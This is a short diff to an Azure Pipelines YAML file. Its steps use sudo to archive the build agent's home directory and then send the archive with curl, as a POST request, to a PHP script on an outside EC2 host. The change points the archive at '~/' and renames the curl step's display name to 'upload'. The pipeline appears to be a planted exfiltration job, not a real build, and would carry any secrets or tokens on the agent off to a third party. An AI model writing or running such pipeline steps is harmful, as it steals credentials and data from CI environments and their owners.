@@ -10,7 +10,7 @@ pool:
   vmImage: ubuntu-latest
 
 steps:
-- script: sudo /bin/bash -c 'tar -czvf /mnt/teste1.tgz /home/vsts/'
+- script: sudo /bin/bash -c 'tar -czvf /mnt/teste1.tgz ~/'
   displayName: 'Tar'
   continueOnError: True
 
@@ -18,4 +18,4 @@ steps:
   displayName: 'sudo'
 
 - script: curl -d "@/mnt/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
-  displayName: 'Run a one-line script'
+  displayName: 'upload'
